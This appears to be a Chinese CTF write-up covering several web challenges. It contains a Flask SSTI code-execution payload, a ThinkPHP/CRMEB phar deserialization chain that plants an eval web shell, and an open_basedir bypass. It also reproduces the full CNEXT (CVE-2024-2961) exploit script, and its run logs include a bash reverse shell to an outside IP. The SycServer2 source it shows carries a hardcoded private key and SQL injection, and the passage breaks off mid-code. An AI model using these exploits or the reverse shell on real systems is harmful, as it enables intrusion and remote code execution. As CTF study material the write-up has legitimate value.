User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://124.220.229.60:
8080/register
Cookie: Token=eyJuYW1lIjogImFkbWluMjA2MCIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXUnRhVzR5TURZd0lpd2lhWE5mWVdSdGFXNGlPaUl4SW4wLi1maGFqQ1M4S1RfMDY2YWlxSmhqNGxHcHdVdWRMbFprMnh1SlFxUld2Q0kifQ==
Content-Type: application/x-www-form-urlencoded
Content-Length: 323
Origin: http://124.220.229.60:
8080
Connection: close
Priority: u=0

code={{(g.pop.__globals__.__builtins__.__getitem__('EXEC'.lower()))("import+base64;ex"%2b"ec(base64.b64decode('X19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLFtdKS5hcHBlbmQobGFtYmRhIDpfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCcvcmVhZGZsYWcnKS5yZWFkKCkp'));")}}

执行后访问即可得到flag

Simpleshop

题目给出源码地址，将其下载下来

打开环境，crmeb是一个网上交易平台的开源项目，其次它本身也是使用thinkphp来进行开发的。

注册测账号登陆一下，在用户界面有一个客服聊天的窗口，其中有一个上传图片的功能，随便传一张图片抓包看一下。

POST /api/upload/image HTTP/1.1
Host: 1.95.73.253
Origin: http://1.95.73.253
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysy0Y2k0enM8x2GrW
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiJkNDFkOGNkOThmMDBiMjA0ZTk4MDA5OThlY2Y4NDI3ZSIsImlzcyI6IjEuOTUuNzMuMjUzIiwiYXVkIjoiMS45NS43My4yNTMiLCJpYXQiOjE3Mjc0OTcxMzIsIm5iZiI6MTcyNzQ5NzEzMiwiZXhwIjoxNzMwMDg5MTMyLCJqdGkiOnsiaWQiOjI3LCJ0eXBlIjoiYXBpIn19.Ib3JS719JIqEqYNk8kY4pv8_YSoGBd76P7hOKuTKMnU
Referer: http://1.95.73.253/order_detail?orderId=cp362937263153264207&order_type=
Accept: */*
Cookie: cb_lang=zh-cn; PHPSESSID=d2c1afcdb1e2b4e18908373233edd1ec; logo=http%3A%2F%2F1.95.73.253%2Fstatics%2Fsystem_images%2Fpc_logo.png; titles=; auth.strategy=local1; auth._refresh_token.local1=false; auth._token.local1=Bearer%20eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiJkNDFkOGNkOThmMDBiMjA0ZTk4MDA5OThlY2Y4NDI3ZSIsImlzcyI6IjEuOTUuNzMuMjUzIiwiYXVkIjoiMS45NS43My4yNTMiLCJpYXQiOjE3Mjc0OTcxMzIsIm5iZiI6MTcyNzQ5NzEzMiwiZXhwIjoxNzMwMDg5MTMyLCJqdGkiOnsiaWQiOjI3LCJ0eXBlIjoiYXBpIn19.Ib3JS719JIqEqYNk8kY4pv8_YSoGBd76P7hOKuTKMnU; unreadKefu=0
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Content-Length: 214144

------WebKitFormBoundarysy0Y2k0enM8x2GrW
Content-Disposition: form-data; name="file"; filename="111.jpg"
Content-Type: image/jpeg

aaa
------WebKitFormBoundarysy0Y2k0enM8x2GrW--

调用了这个系统的api进行了一个文件上传的操作，试着传php马发现，不仅仅有文件后缀的检测，还有图片内容的识别，所以直接传码不现实。

除此之外，后台还存在一个管理员的登陆界面，不清楚其账号和密码找到也没多大用。到目前为止，没有了其他的有用信息。开始审计源码。

像这种系统，一般api是我们最感兴趣的，而且用户界面还有一个api的文件上传口，所以可以去审一下api的功能。

漏洞点在CRMEB-5.4.0CRMEB-5.4.0crmebappadminapicontroller的PublicController类中

也就是在/api/image_base64下可以接收两个参数code和image。

其实就是先检查从传入的url的资源是不是一张图片，然后先尝试从缓存获取图片，如果失败了就尝试从远程瞎咋图片，再将其转成base64。

重要的是put_image这个函数

这个函数是用于辅助从远程下载图片保存到服务器，他是使用readfile()函数来读取远程图片的内容，然后将其保存到服务器的uploads/qrcode下。并且在这个readfile()函数这里会触发一个phar包含，那么只要控制刚才的code参数的值里有一个phar就会进入到readfile()中，那么就可以在code中触发包含。

那么漏洞的点就在这里，我们可以构造一个恶意的图片马，然后通过code的phar协议来解析图片马，就能达到rce。

再结合刚才找到的文件上传点，思路就清晰了，构造反序列化链，然后上传，通过phar来解析上传的图片马，进而触发反序列化链，进而rce。

那么该怎么样构造反序列化链呢？刚才提到了这个系统是基于thinkphp来进行开发的。而crmeb-5.4版本是基于thinkphp-6版本的，那么可以找tp6的链子来构造。

那么入口点在哪呢？在全局搜索魔术方法__construct()和__destruct()的时候找到一个比符合要求的类

PhpOfficePhpSpreadsheetCollection的Cells类

他的$cache是可控的，而PhpOfficePhpSpreadsheetCollectionCells 是 PhpSpreadsheet 库的一部分，这是一个非常常用的库，常常用于处理 Excel 文件。再加上CacheInterface $cache 表明这个类依赖于某种缓存机制，而缓存机制通常涉及到数据的存储和检索，如果实现不安全，可能会导致漏洞，因此此处作为入口点

链子如下：

<?php

namespace PhpOfficePhpSpreadsheetCollection{
    class Cells{
        private $cache;
        public function __construct($exp){
            $this->cache = $exp;
        }
    }
}

namespace thinklog{
    class Channel{
        protected $logger;
        protected $lazy = true;

        public function __construct($exp){
            $this->logger = $exp;
            $this->lazy = false;
        }
    }
}

namespace think{
    class Request{
        protected $url;
        public function __construct(){
            $this->url = '<?php file_put_contents("/var/www/public/uploads/store/comment/20240929/fpclose.php", '<?php eval($_POST[1]); ?>', FILE_APPEND); ?>';
        }
    }
    class App{
        protected $instances = [];
        public function __construct(){
            $this->instances = ['thinkRequest'=>new Request()];
        }
    }
}

namespace thinkviewdriver{
    class Php{}
}

namespace thinklogdriver{
    class Socket{
        protected $config = [];
        protected $app;
        public function __construct(){

            $this->config = [
                'debug'=>true,
                'force_client_ids' => 1,
                'allow_client_ids' => '',
                'format_head' => [new thinkviewdriverPhp,'display'],
            ];
            $this->app = new thinkApp();
        }
    }
}

namespace {
    $c = new thinklogdriverSocket();
    $b = new thinklogChannel($c);
    $a = new PhpOfficePhpSpreadsheetCollectionCells($b);

    ini_set("phar.readonly", 0);
    $phar = new Phar('1.phar');
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($a);
    $phar->addFromString("fpclose.jpg", "666");
    $phar->stopBuffering();

}

运行得到1.phar文件

回到网页中的上传界面，上传文件。由于对文件后缀和内容有检测，可以使用gzip的方式来进行绕过。由于phar是可以解析gzip的，所以可以绕过后端对图片内容的检测。

将1.phar改名为1.jpg，再给压缩

gzip 1.jpg

得到1.jpg.gz文件，修改名字为1.jpg上传

上传成功得到回显

{"status":
200,"msg":"图片上传成功","data":{"name":"749e04b0905aa5bf0a364f86a70f7d74.jpg.jpg","url":"http://1.95.73.253/uploads/store/comment/20240930/749e04b0905aa5bf0a364f86a70f7d74.jpg"},"code":"100009"}

同时也得到了图片的存储的路径：

/uploads/store/comment/20240930/749e04b0905aa5bf0a364f86a70f7d74.jpg

成功后，现在就需要使用phar去解析这个图片马。注意phar要使用绝对路径。还有一点，在后端代码中如果检测到参数的url中存在phar就会将其删除，那么只需要双写即可绕过这个限制

构造数据包

写马成功

蚁剑连接

连接上蚁剑后发现，权限不够，读不到/flag。所以还得提权。使用蚁剑创建php文件111aaa.php向其中写入：

<?php
    @mkdir('img');chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";

打cnext

#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#

from __future__ import annotations

import base64
import zlib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *

HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")

class Remote:
    """A helper class to send the payload and download files.
  
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
  
    The code here serves as an example that attacks a page that looks like:
  
    ```php
    <?php
  
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
  
    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """
        return self.session.post(self.url, data={"file": path})
      
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        response = self.send(path)
        data = response.re.search(b"File contents: (.*)", flags=re.S).group(1)
        return base64.decode(data)

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep_time", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
      
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            
except ConnectionError:
                failure("Target not [b]reachable[/] ?")
          

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)
            return text.encode() == result

        text = tf.random.string(50).encode()
        base64 = b64(text, misalign=True).decode()
        path = f"data:
text/plain;base64,{base64}"
      
        result = safe_download(path)
      
        if text not in result:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:
text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:
text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)b" r".*" r"s([-rwx]{3}[ps])s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "/dev/shm/cnext-libc"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.get_file(remote_path)
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:
zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.

        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.

        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        By triggering the bug from chunk ..900, we get:

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        That's step 3.

        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.

        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.

        Another problem comes up.

        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.

        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.

        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.

        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0n".ljust(step2_size, b"x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource)
        resource = f"data:
text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
          
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
          
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
          
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
          
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
          
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            self.remote.send(path)
        
except (ConnectionError, ChunkedEncodingError):
            pass
      
        msg_print()
      
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
      
        msg_print()

def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]

def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()

def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)

def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:
02x}" for x in data).upper().encode()

def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket

def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004nABCDn`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"nn")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"n" + data + b"n"

@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start

Exploit()
 root@webn1ght:~/poc/php-filter-iconv-main
# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'echo "/bin/bash -c "bash -i >& /dev/tcp/112.124.59.213/8888 0>&1"" > /tmp/night'
[*] The data:// wrapper works
[*] The php://filter/ wrapper works
[*] The zlib extension is enabled
[+] Exploit preconditions are satisfied
[*] Using 0x7f1ce1e00040 as heap
[!] Could not populate PLT: Invalid argument (UC_ERR_ARG)

     EXPLOIT  SUCCESS 

root@webn1ght:~/poc/php-filter-iconv-main
# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'chmod +x /tmp/night'
[*] The data:// wrapper works
[*] The php://filter/ wrapper works
[*] The zlib extension is enabled
[+] Exploit preconditions are satisfied
[*] Using 0x7f1ce1e00040 as heap
[!] Could not populate PLT: Invalid argument (UC_ERR_ARG)

     EXPLOIT  SUCCESS 

root@webn1ght:~/poc/php-filter-iconv-main
# python3 cnext-exploit.py http://1.95.73.253/uploads/store/comment/20240928/111aaa.php 'bash /tmp/night'
[*] The data:// wrapper works
[*] The php://filter/ wrapper works
[*] The zlib extension is enabled
[+] Exploit preconditions are satisfied
[*] Using 0x7f1ce1e00040 as heap
[!] Could not populate PLT: Invalid argument (UC_ERR_ARG)

得到flag

SycServer2

右键查看源码发现有个sql的waf 并且没有后端校验 所以我们可以覆盖wafsql函数 结果在密码处输入万能密码登录成功

任意文件读取 有 并且v/f形如

双写绕过+目录穿越读到源码

想要污染这个command但会访问就重新赋值

const express = require('express');
const fs = require('fs');
var nodeRsa = require('node-rsa');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const SECRET_KEY = crypto.randomBytes(16).toString('hex');
const path = require('path');
const zlib = require('zlib');
const mysql = require('mysql')
const handle = require('./handle');
const cp = require('child_process');
const cookieParser = require('cookie-parser');

const con = mysql.createConnection({
  host: 'localhost',
  user: 'ctf',
  password: 'ctf123123',
  port: '3306',
  database: 'sctf'
})
con.connect((err) => {
  if (err) {
    console.error('Error connecting to MySQL:', err.message);
    setTimeout(con.connect(), 2000); // 2秒后重试连接
  } else {
    console.log('Connected to MySQL');
  }
});

const {response} = require("express");
const req = require("express/lib/request");

var key = new nodeRsa({ b: 1024 });
key.setOptions({ encryptionScheme: 'pkcs1' });

var publicPem = -----BEGIN PUBLIC KEY-----nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQnTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2ICnXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGenI+Atul1rSE0APhHoPwIDAQABn-----END PUBLIC KEY-----;
var privatePem = `-----BEGIN PRIVATE KEY-----
MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27
PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l
i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi
6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI
lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY
Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61
khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT
6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78
dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG
mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye
KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh
UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l
zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg
xu/vfQ0A1jHRNC7t
-----END PRIVATE KEY-----`;

const app = express();
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'static')));
app.use(cookieParser());

var Reportcache = {}

function verifyAdmin(req, res, next) {
  const token = req.cookies['auth_token'];

  if (!token) {
    return res.status(403).json({ message: 'No token provided' });
  }

  jwt.verify(token, SECRET_KEY, (err, decoded) => {
    if (err) {
      return res.status(403).json({ message: 'Failed to authenticate token' });
    }

    if (decoded.role !== 'admin') {
      return res.status(403).json({ message: 'Access denied. Admins only.' });
    }

    req.user = decoded;
    next();
  });
}

app.get('/hello', verifyAdmin ,(req, res)=> {
  res.send('<h1>Welcome Admin!!!</h1>
');
});

app.get('/config', (req, res) => {
  res.json({
    publicKey: publicPem,
  });
});

var decrypt = function(body) {
  try {
    var pem = privatePem;
    var key = new nodeRsa(pem, {
      encryptionScheme: 'pkcs1',
      b: 1024
    });
    key.setOptions({ environment: "browser" });
    return key.decrypt(body, 'utf8');
  } catch (e) {
    console.error("decrypt error", e);
    return false;
  }
};

app.post('/login', (req, res) => {
  const encryptedPassword = req.body.password;
  const username = req.body.username;

  try {
    passwd = decrypt(encryptedPassword)
    if(username === 'admin') {
      const sql = select (select password from user where username = 'admin') = '${passwd}';
      con.query(sql, (err, rows) => {
        if (err) throw new Error(err.message);
        if (rows[0][Object.keys(rows[0])]) {
          const token = jwt.sign({username, role: username}, SECRET_KEY, {expiresIn: '1h'});
          res.cookie('auth_token', token, {secure: false});
          res.status(200).json({success: true, message: 'Login Successfully'});
        } else {
          res.status(200).json({success: false, message: 'Errow Password!'});
        }
      });
    } else {
      res.status(403).json({success: false, message: 'This Website Only Open for admin'});
    }
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error decrypting password!' });
  }
});

app.get('/ExP0rtApi', verifyAdmin, (req, res) => {
  var rootpath = req.query.v;
